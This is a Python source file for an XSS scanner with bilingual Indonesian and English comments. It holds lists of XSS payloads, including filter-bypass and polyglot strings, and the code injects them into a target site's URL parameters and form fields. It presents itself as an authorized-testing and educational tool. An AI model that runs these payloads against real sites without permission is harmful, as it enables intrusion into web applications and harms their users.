#!/usr/bin/env python3
"""
XSS Vulnerability Testing Tool
===============================

PENTING/IMPORTANT:
- Hanya gunakan tool ini pada website yang Anda miliki atau memiliki izin tertulis
- Only use this tool on websites you own or have written permission to test
- Pengujian keamanan tanpa izin adalah ILEGAL
- Security testing without permission is ILLEGAL

Tool ini dibuat untuk:
- Tujuan edukasi / Educational purposes
- Pengujian keamanan yang sah / Authorized security testing
- CTF challenges
- Defensive security research
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import argparse
import json
from typing import List, Dict, Tuple
from colorama import init, Fore, Style
import time

# Initialize colorama untuk colored output
init(autoreset=True)


class XSSPayloads:
    """Koleksi XSS payloads untuk berbagai konteks"""

    # Basic XSS payloads
    BASIC = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "<body onload=alert('XSS')>",
    ]

    # Attribute context
    ATTRIBUTE = [
        "' onmouseover='alert(1)",
        '" onmouseover="alert(1)',
        "javascript:alert('XSS')",
        "' autofocus onfocus='alert(1)",
    ]

    # JavaScript context
    JAVASCRIPT = [
        "'-alert(1)-'",
        "';alert(1)//",
        "\";alert(1)//",
        "</script><script>alert(1)</script>",
    ]

    # Advanced/Bypass payloads
    ADVANCED = [
        "<img src=\"x\" onerror=\"alert(1)\">",
        "<svg><script>alert&#40;1&#41;</script>",
        "<iframe src=\"javascript:alert(1)\">",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<div onpointerover=\"alert(1)\">XSS</div>",
    ]

    # Polyglot (works in multiple contexts)
    POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
        "'\"><img src=x onerror=alert(1)>",
    ]

    @classmethod
    def get_all_payloads(cls) -> List[str]:
        """Return all payloads"""
        return (cls.BASIC + cls.ATTRIBUTE + cls.JAVASCRIPT +
                cls.ADVANCED + cls.POLYGLOT)

    @classmethod
    def get_basic_payloads(cls) -> List[str]:
        """Return basic payloads for quick testing"""
        return cls.BASIC


class XSSVulnerabilityTester:
    """Main XSS vulnerability testing class"""

    def __init__(self, target_url: str, payloads: List[str] = None,
                 verbose: bool = False, delay: float = 0.5):
        self.target_url = target_url
        self.payloads = payloads or XSSPayloads.get_basic_payloads()
        self.verbose = verbose
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []

    def print_banner(self):
        """Print tool banner"""
        banner = f"""
{Fore.CYAN}{'='*70}
{Fore.YELLOW}  XSS Vulnerability Testing Tool
{Fore.RED}  ⚠️  HANYA UNTUK PENGUJIAN YANG SAH / AUTHORIZED TESTING ONLY ⚠️
{Fore.CYAN}{'='*70}
{Fore.GREEN}Target: {self.target_url}
{Fore.GREEN}Payloads: {len(self.payloads)}
{Fore.CYAN}{'='*70}{Style.RESET_ALL}
        """
        print(banner)

    def log(self, message: str, level: str = "INFO"):
        """Log messages with colors"""
        colors = {
            "INFO": Fore.BLUE,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.RED + Style.BRIGHT
        }
        color = colors.get(level, Fore.WHITE)
        print(f"{color}[{level}] {message}{Style.RESET_ALL}")

    def test_reflected_xss_in_url(self) -> List[Dict]:
        """Test for reflected XSS in URL parameters"""
        self.log("Testing reflected XSS in URL parameters...")
        vulnerabilities = []

        try:
            # Parse URL
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)

            if not params:
                self.log("No URL parameters found", "WARNING")
                return vulnerabilities

            # Test each parameter
            for param_name in params.keys():
                self.log(f"Testing parameter: {param_name}")

                for payload in self.payloads:
                    # Create modified params
                    test_params = params.copy()
                    test_params[param_name] = [payload]

                    # Rebuild URL
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        new_query,
                        parsed.fragment
                    ))

                    # Send request
                    try:
                        response = self.session.get(test_url, timeout=10)

                        # Check if payload is reflected
                        if payload in response.text:
                            vuln = {
                                'type': 'Reflected XSS',
                                'location': 'URL Parameter',
                                'parameter': param_name,
                                'payload': payload,
                                'url': test_url,
                                'confidence': 'High' if '<script' in payload.lower() else 'Medium'
                            }
                            vulnerabilities.append(vuln)
                            self.log(f"POTENTIAL VULNERABILITY FOUND: {param_name} with payload: {payload[:50]}...", "VULN")

                            if self.verbose:
                                self.log(f"Full URL: {test_url}")

                        time.sleep(self.delay)

                    except requests.RequestException as e:
                        self.log(f"Request error: {str(e)}", "ERROR")

        except Exception as e:
            self.log(f"Error testing URL parameters: {str(e)}", "ERROR")

        return vulnerabilities

    def test_reflected_xss_in_forms(self) -> List[Dict]:
        """Test for reflected XSS in form inputs"""
        self.log("Testing reflected XSS in forms...")
        vulnerabilities = []

        try:
            # Get the page
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find all forms
            forms = soup.find_all('form')

            if not forms:
                self.log("No forms found on the page", "WARNING")
                return vulnerabilities

            self.log(f"Found {len(forms)} form(s)")

            # Test each form
            for form_idx, form in enumerate(forms):
                self.log(f"Testing form #{form_idx + 1}")

                # Get form details
                action = form.get('action', '')
                method = form.get('method', 'get').lower()

                # Build absolute URL
                form_url = urljoin(self.target_url, action) if action else self.target_url

                # Get all inputs
                inputs = form.find_all(['input', 'textarea', 'select'])

                if not inputs:
                    continue

                # Test each input
                for input_field in inputs:
                    input_name = input_field.get('name')
                    input_type = input_field.get('type', 'text')

                    if not input_name or input_type in ['submit', 'button', 'reset']:
                        continue

                    self.log(f"  Testing input: {input_name}")

                    for payload in self.payloads:
                        # Prepare form data
                        form_data = {}
                        for inp in inputs:
                            name = inp.get('name')
                            if name:
                                if name == input_name:
                                    form_data[name] = payload
                                else:
                                    form_data[name] = inp.get('value', '')

                        # Submit form
                        try:
                            if method == 'post':
                                resp = self.session.post(form_url, data=form_data, timeout=10)
                            else:
                                resp = self.session.get(form_url, params=form_data, timeout=10)

                            # Check if payload is reflected
                            if payload in resp.text:
                                vuln = {
                                    'type': 'Reflected XSS',
                                    'location': 'Form Input',
                                    'form_action': form_url,
                                    'method': method.upper(),
                                    'parameter': input_name,
                                    'payload': payload,
                                    'confidence': 'High' if '<script' in payload.lower() else 'Medium'
                                }
                                vulnerabilities.append(vuln)
                                self.log(f"POTENTIAL VULNERABILITY FOUND in form input: {input_name}", "VULN")

                            time.sleep(self.delay)

                        except requests.RequestException as e:
                            self.log(f"Request error: {str(e)}", "ERROR")

        except Exception as e:
            self.log(f"Error testing forms: {str(e)}", "ERROR")

        return vulnerabilities

    def test_dom_based_xss(self) -> List[Dict]:
        """Basic DOM-based XSS detection (limited without JavaScript execution)"""
        self.log("Checking for potential DOM-based XSS patterns...")
        vulnerabilities = []

        try:
            response = self.session.get(self.target_url, timeout=10)

            # Look for dangerous JavaScript patterns
            dangerous_patterns = [
                'document.write(',
                'innerHTML',
                'eval(',
                'location.hash',
                'location.search',
                'document.URL',
                'document.referrer',
            ]

            found_patterns = []
            for pattern in dangerous_patterns:
                if pattern in response.text:
                    found_patterns.append(pattern)

            if found_patterns:
                vuln = {
                    'type': 'Potential DOM-based XSS',
                    'location': 'JavaScript Code',
                    'patterns': found_patterns,
                    'confidence': 'Low',
                    'note': 'Manual verification required - dangerous JavaScript patterns detected'
                }
                vulnerabilities.append(vuln)
                self.log(f"Found dangerous JS patterns: {', '.join(found_patterns)}", "WARNING")

        except Exception as e:
            self.log(f"Error checking DOM-based XSS: {str(e)}", "ERROR")

        return vulnerabilities

    def run_full_test(self) -> Dict:
        """Run all XSS tests"""
        self.print_banner()

        all_vulnerabilities = []

        # Test reflected XSS in URLs
        url_vulns = self.test_reflected_xss_in_url()
        all_vulnerabilities.extend(url_vulns)

        # Test reflected XSS in forms
        form_vulns = self.test_reflected_xss_in_forms()
        all_vulnerabilities.extend(form_vulns)

        # Test DOM-based XSS
        dom_vulns = self.test_dom_based_xss()
        all_vulnerabilities.extend(dom_vulns)

        # Store results
        self.vulnerabilities = all_vulnerabilities

        # Print summary
        self.print_summary()

        return {
            'target': self.target_url,
            'total_vulnerabilities': len(all_vulnerabilities),
            'vulnerabilities': all_vulnerabilities
        }

    def print_summary(self):
        """Print test summary"""
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.YELLOW}Test Summary")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")

        if not self.vulnerabilities:
            print(f"{Fore.GREEN}No vulnerabilities found (or site is protected){Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Found {len(self.vulnerabilities)} potential vulnerability(ies):{Style.RESET_ALL}\n")

            for idx, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{Fore.YELLOW}[{idx}] {vuln['type']}{Style.RESET_ALL}")
                for key, value in vuln.items():
                    if key != 'type':
                        print(f"    {key}: {value}")
                print()

        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")

    def save_report(self, filename: str = "xss_report.json"):
        """Save report to JSON file"""
        report = {
            'target': self.target_url,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities
        }

        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)

        self.log(f"Report saved to {filename}", "SUCCESS")


def main():
    parser = argparse.ArgumentParser(
        description='XSS Vulnerability Testing Tool - UNTUK PENGUJIAN YANG SAH SAJA',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic test
  python xss_vulnerability_tester.py -u "http://testphp.vulnweb.com/search.php?test=query"

  # Full test with all payloads
  python xss_vulnerability_tester.py -u "http://example.com" --full

  # Verbose mode with report
  python xss_vulnerability_tester.py -u "http://example.com" -v -o report.json

PERINGATAN / WARNING:
  Hanya gunakan pada sistem yang Anda miliki atau memiliki izin tertulis!
  Only use on systems you own or have written permission to test!
        """
    )

    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--full', action='store_true', help='Use all payloads (slower but more comprehensive)')
    parser.add_argument('-o', '--output', help='Save report to JSON file')
    parser.add_argument('-d', '--delay', type=float, default=0.5, help='Delay between requests (seconds)')

    args = parser.parse_args()

    # Warning
    print(f"\n{Fore.RED}{'='*70}")
    print(f"{Fore.RED}⚠️  PERINGATAN / WARNING ⚠️")
    print(f"{Fore.RED}{'='*70}")
    print(f"{Fore.YELLOW}Pengujian keamanan tanpa izin adalah ILEGAL!")
    print(f"{Fore.YELLOW}Security testing without permission is ILLEGAL!")
    print(f"{Fore.RED}{'='*70}{Style.RESET_ALL}\n")

    confirmation = input(f"{Fore.CYAN}Apakah Anda memiliki izin untuk menguji {args.url}? (yes/no): {Style.RESET_ALL}")
    if confirmation.lower() not in ['yes', 'y']:
        print(f"{Fore.RED}Testing cancelled.{Style.RESET_ALL}")
        return

    # Get payloads
    payloads = XSSPayloads.get_all_payloads() if args.full else XSSPayloads.get_basic_payloads()

    # Create tester instance
    tester = XSSVulnerabilityTester(
        target_url=args.url,
        payloads=payloads,
        verbose=args.verbose,
        delay=args.delay
    )

    # Run tests
    results = tester.run_full_test()

    # Save report if requested
    if args.output:
        tester.save_report(args.output)

    print(f"\n{Fore.GREEN}Testing completed!{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
